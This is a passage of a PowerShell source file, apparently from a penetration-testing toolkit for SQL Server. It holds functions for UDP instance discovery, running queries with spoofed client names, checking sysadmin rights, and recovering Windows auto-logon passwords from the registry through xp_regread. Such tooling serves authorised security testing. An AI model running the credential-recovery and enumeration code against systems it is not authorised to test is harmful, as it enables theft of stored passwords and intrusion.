            BaseVersion  : 11.0.2100.60
            IsClustered  : No

            ComputerName : SQLServer1.domain.com
            Instance     : SQLServer1.domain.com\Standard
            InstanceName : Standard
            ServerIP     : 10.10.10.30
            TCPPort      : 51861
            BaseVersion  : 11.0.2100.60
            IsClustered  : No
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLInstanceScanUDP -Verbose
            VERBOSE:  - SQLServer1.domain.com - UDP Scan Start.
            VERBOSE:  - SQLServer1.domain.com - UDP Scan Complete.


            ComputerName : SQLServer1.domain.com
            Instance     : SQLServer1.domain.com\Express
            InstanceName : Express
            ServerIP     : 10.10.10.30
            TCPPort      : 51663
            BaseVersion  : 11.0.2100.60
            IsClustered  : No

            ComputerName : SQLServer1.domain.com
            Instance     : SQLServer1.domain.com\Standard
            InstanceName : Standard
            ServerIP     : 10.10.10.30
            TCPPort      : 51861
            BaseVersion  : 11.0.2100.60
            IsClustered  : No
            [TRUNCATED]
    #>
    [CmdletBinding()]
    param(

        [Parameter(Mandatory = $true,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name or IP address to enumerate SQL Instance from.')]
        [string]$ComputerName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Timeout in seconds. Longer timeout = more accurate.')]
        [int]$UDPTimeOut = 2,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup data table for results
        $TableResults = New-Object -TypeName system.Data.DataTable -ArgumentList 'Table'
        $null = $TableResults.columns.add('ComputerName')
        $null = $TableResults.columns.add('Instance')
        $null = $TableResults.columns.add('InstanceName')
        $null = $TableResults.columns.add('ServerIP')
        $null = $TableResults.columns.add('TCPPort')
        $null = $TableResults.columns.add('BaseVersion')
        $null = $TableResults.columns.add('IsClustered')
    }

    Process
    {
        if(-not $SuppressVerbose)
        {
            Write-Verbose -Message " - $ComputerName - UDP Scan Start."
        }

        # Verify server name isn't empty
        if ($ComputerName -ne '')
        {
            # Try to enumerate SQL Server instances from remote system
            try
            {
                # Resolve IP
                $IPAddress = [System.Net.Dns]::GetHostAddresses($ComputerName)

                # Create UDP client object
                $UDPClient = New-Object -TypeName System.Net.Sockets.Udpclient

                # Attempt to connect to system
                $UDPTimeOutMilsec = $UDPTimeOut * 1000
                $UDPClient.client.ReceiveTimeout = $UDPTimeOutMilsec
                $UDPClient.Connect($ComputerName,0x59a)
                $UDPPacket = 0x03

                # Send request to system
                $UDPEndpoint = New-Object -TypeName System.Net.Ipendpoint -ArgumentList ([System.Net.Ipaddress]::Any, 0)
                $UDPClient.Client.Blocking = $true
                [void]$UDPClient.Send($UDPPacket,$UDPPacket.Length)

                # Process response from system
                $BytesRecived = $UDPClient.Receive([ref]$UDPEndpoint)
                $Response = [System.Text.Encoding]::ASCII.GetString($BytesRecived).split(';')

                $values = @{}

                for($i = 0; $i -le $Response.length; $i++)
                {
                    if(![string]::IsNullOrEmpty($Response[$i]))
                    {
                        $values.Add(($Response[$i].ToLower() -replace '[\W]', ''),$Response[$i+1])
                    }
                    else
                    {
                        if(![string]::IsNullOrEmpty($values.'tcp'))
                        {
                            if(-not $SuppressVerbose)
                            {
                                $DiscoveredInstance = "$ComputerName\"+$values.'instancename'
                                Write-Verbose -Message "$ComputerName - Found: $DiscoveredInstance"
                            }

                            # Add SQL Server instance info to results table
                            $null = $TableResults.rows.Add(
                                [string]$ComputerName,
                                [string]"$ComputerName\"+$values.'instancename',
                                [string]$values.'instancename',
                                [string]$IPAddress,
                                [string]$values.'tcp',
                                [string]$values.'version',
                            [string]$values.'isclustered')
                            $values = @{}
                        }
                    }
                }

                # Close connection
                $UDPClient.Close()
            }
            catch
            {
                #"Error was $_"
                #$line = $_.InvocationInfo.ScriptLineNumber
                #"Error was in Line $line"

                # Close connection
                # $UDPClient.Close()
            }
        }
        if(-not $SuppressVerbose)
        {
            Write-Verbose -Message " - $ComputerName - UDP Scan Complete."
        }
    }

    End
    {
        # Return Results
        $TableResults
    }
}

Function Get-SQLQuery
{
    <#
            .SYNOPSIS
            Executes a query on target SQL servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER Database
            Default database to connect to.
            .PARAMETER TimeOut
            Connection time out.
            .PARAMETER SuppressVerbose
            Suppress verbose errors.  Used when function is wrapped.
            .PARAMETER Threads
            Number of concurrent threads.
            .PARAMETER Query
            Query to be executed on the SQL Server.
            .PARAMETER AppName
            Spoof the name of the application you are connecting to SQL Server with.
            .PARAMETER WorkstationId
            Spoof the name of the workstation/hostname you are connecting to SQL Server with.
            .PARAMETER Encrypt
            Use an encrypted connection.
            .PARAMETER TrustServerCert
            Trust the certificate of the remote server.
            .EXAMPLE
            PS C:\> Get-SQLQuery -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress" -Query "Select @@version" -Threads 15
            .EXAMPLE
            PS C:\> Get-SQLQuery -Verbose -Instance "SQLSERVER1.domain.com,1433" -Query "Select @@version" -Threads 15
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLQuery -Verbose -Query "Select @@version" -Threads 15
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server query.')]
        [string]$Query,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [int]$TimeOut,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the application your connecting to the server with.')]
        [string]$AppName = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the workstation/hostname your connecting to the server with.')]
        [string]$WorkstationId = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use an encrypted connection.')]
        [ValidateSet("Yes","No","")]
        [string]$Encrypt = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Trust the certificate of the remote server.')]
        [ValidateSet("Yes","No","")]
        [string]$TrustServerCert = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Return error message if exists.')]
        [switch]$ReturnError
    )

    Begin
    {
        # Setup up data tables for output
        $TblQueryResults = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Setup DAC string
        if($DAC)
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -DAC -Database $Database -AppName $AppName -WorkstationId $WorkstationId -Encrypt $Encrypt -TrustServerCert $TrustServerCert
        }
        else
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database -AppName $AppName -WorkstationId $WorkstationId -Encrypt $Encrypt -TrustServerCert $TrustServerCert
        }

        # Parse SQL Server instance name
        $ConnectionString = $Connection.Connectionstring
        $Instance = $ConnectionString.split(';')[0].split('=')[1]

        # Check for query
        if($Query)
        {
            # Attempt connection
            try
            {
                # Open connection
                $Connection.Open()

                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Setup SQL query
                $Command = New-Object -TypeName System.Data.SqlClient.SqlCommand -ArgumentList ($Query, $Connection)

                # Grab results
                $Results = $Command.ExecuteReader()

                # Load results into data table
                $TblQueryResults.Load($Results)

                # Close connection
                $Connection.Close()

                # Dispose connection
                $Connection.Dispose()
            }
            catch
            {
                # Connection failed - for detail error use  Get-SQLConnectionTest
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Failed."
                }

                if($ReturnError)
                {
                    $ErrorMessage = $_.Exception.Message
                    #Write-Verbose  " Error: $ErrorMessage"
                }
            }
        }
        else
        {
            Write-Output -InputObject 'No query provided to Get-SQLQuery function.'
            Break
        }
    }

    End
    {
        # Return Results
        if($ReturnError)
        {
            $ErrorMessage
        }
        else
        {
            $TblQueryResults
        }
    }
}

Function   Get-SQLRecoverPwAutoLogon
{
    <#
            .SYNOPSIS
            Returns the Windows auto login credentials through SQL Server using xp_regread.
            This requires sysadmin privileges.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .Example
            PS C:\> Get-SQLInstanceLocal |  Get-SQLRecoverPwAutoLogon -Verbose
            VERBOSE: SQLServer1\SQLEXPRESS : Connection Success.
            VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
            VERBOSE: SQLServer1 : Connection Success.


            ComputerName : SQLServer1
            Instance     : SQLServer1\SQLEXPRESS
            Domain       : Demo
            UserName     : KioskAdmin
            Password     : KioskPassword!

            ComputerName : SQLServer1
            Instance     : SQLServer1\SQLEXPRESS
            Domain       : Demo
            UserName     : kioskuser
            Password     : KioskUserPassword!

            .Example
            PS C:\> Get-SQLRecoverPwAutoLogon -Verbose -instance SQLServer1\STANDARDDEV2014
            VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.


            ComputerName : SQLServer1
            Instance     : SQLServer1\STANDARDDEV2014
            Domain       : localhost
            UserName     : KioskAdmin
            Password     : KioskPassword!

            ComputerName : SQLServer1
            Instance     : SQLServer1\STANDARDDEV2014
            Domain       : localhost2
            UserName     : kioskuser
            Password     : KioskUserPassword!

            .Notes
            https://support.microsoft.com/en-us/kb/321185
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblWinAutoCreds = New-Object -TypeName System.Data.DataTable
        $TblWinAutoCreds.Columns.Add("ComputerName") | Out-Null
        $TblWinAutoCreds.Columns.Add("Instance") | Out-Null
        $TblWinAutoCreds.Columns.Add("Domain") | Out-Null
        $TblWinAutoCreds.Columns.Add("UserName") | Out-Null
        $TblWinAutoCreds.Columns.Add("Password") | Out-Null
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Get sysadmin status
        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

        # Get SQL Server version number
        $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if($SQLVersionFull)
        {
            $SQLVersionShort = $SQLVersionFull.Split('.')[0]
        }

        # Check if this can actually run with the current login
        if($IsSysadmin -ne "Yes")
        {
            Write-Verbose "$Instance : This function requires sysadmin privileges. Done."
            Return
        }

        # Get default auto login Query
        $DefaultQuery = "
        -------------------------------------------------------------------------
        -- Get Windows Auto Login Credentials from the Registry
        -------------------------------------------------------------------------

        -- Get AutoLogin Default Domain
        DECLARE @AutoLoginDomain  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'DefaultDomainName',
        @value			= @AutoLoginDomain output

        -- Get AutoLogin DefaultUsername
        DECLARE @AutoLoginUser  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'DefaultUserName',
        @value			= @AutoLoginUser output

        -- Get AutoLogin DefaultUsername
        DECLARE @AutoLoginPassword  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'DefaultPassword',
        @value			= @AutoLoginPassword output

        -- Display Results
        SELECT Domain = @AutoLoginDomain, Username = @AutoLoginUser, Password = @AutoLoginPassword"

        # Execute Default Query
        $DefaultResults = Get-SQLQuery -Instance $Instance -Query $DefaultQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $DefaultUsername = $DefaultResults.Username
        if($DefaultUsername.length -ge 2){

            # Add record to data table
            $DefaultResults | ForEach-Object{
                $TblWinAutoCreds.Rows.Add($ComputerName, $Instance,$_.Domain,$_.Username,$_.Password) | Out-Null
            }
        }else{
            Write-Verbose "$Instance : No default auto login credentials found."
        }

        # Get default alt auto login Query
        $AltQuery = "
        -------------------------------------------------------------------------
        -- Get Alternative Windows Auto Login Credentials from the Registry
        -------------------------------------------------------------------------

        -- Get Alt AutoLogin Default Domain
        DECLARE @AltAutoLoginDomain  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'AltDefaultDomainName',
        @value			= @AltAutoLoginDomain output

        -- Get Alt AutoLogin DefaultUsername
        DECLARE @AltAutoLoginUser  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'AltDefaultUserName',
        @value			= @AltAutoLoginUser output

        -- Get Alt AutoLogin DefaultUsername
        DECLARE @AltAutoLoginPassword  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'AltDefaultPassword',
        @value			= @AltAutoLoginPassword output

        -- Display Results
        SELECT Domain = @AltAutoLoginDomain, Username = @AltAutoLoginUser, Password = @AltAutoLoginPassword"

        # Execute Default Query
        $AltResults = Get-SQLQuery -Instance $Instance -Query $AltQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $AltUsername = $AltResults.Username
        if($AltUsername.length -ge 2){

             # Add record to data table
            $AltResults | ForEach-Object{
                $TblWinAutoCreds.Rows.Add($ComputerName, $Instance,$_.Domain,$_.Username,$_.Password) | Out-Null
            }
        }else{
            Write-Verbose "$Instance : No alternative auto login credentials found."
        }
    }

    End
    {
        # Return data
         $TblWinAutoCreds
    }
}

Function  Get-SQLSysadminCheck
{
    <#
            .SYNOPSIS
            Check if login is has sysadmin privilege on the target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .EXAMPLE
            PS C:\> Get-SQLSysadminCheck -Instance SQLServer1\STANDARDDEV2014

            ComputerName   Instance                       IsSysadmin
            ------------   --------                       ----------
            SQLServer1     SQLServer1\STANDARDDEV2014     Yes
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLStoredProcure -Verbose -NoDefaults
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Data for output
        $TblSysadminStatus = New-Object -TypeName System.Data.DataTable

        # Setup CredentialName filter
        if($CredentialName)
        {
            $CredentialNameFilter = " WHERE name like '$CredentialName'"
        }
        else
        {
            $CredentialNameFilter = ''
        }

    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "SELECT    '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            CASE
            WHEN IS_SRVROLEMEMBER('sysadmin') =  0 THEN 'No'
            ELSE 'Yes'
        END as IsSysadmin"

        # Execute Query
        $TblSysadminStatusTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append results
        $TblSysadminStatus = $TblSysadminStatus + $TblSysadminStatusTemp
    }

    End
    {
        # Return data
        $TblSysadminStatus
    }
}


# ----------------------------------
#  Get-SQLLocalAdminCheck
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLLocalAdminCheck
{
    <#
            .SYNOPSIS
            Check if the current Windows user is running in a local adminsitrator context.
            PS C:\> Get-SQLLocalAdminCheck

            $true
    #>
    Begin
    {
    }

    Process
    {
        # Get current windows user
        $WinCurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()

        # Get current windows username
        $WinCurrentUserName = $WinCurrentUser.name

        # Get current windows user's groups
        $WinGroups = New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($WinCurrentUser)

        # Check if the current windows user/groups are local administrators / process is elevated
        $WinRoleCheck = [System.Security.Principal.WindowsBuiltInRole]::Administrator

        # Return true or false
        $WinGroups.IsInRole($WinRoleCheck)
    }

    End
    {
    }
}
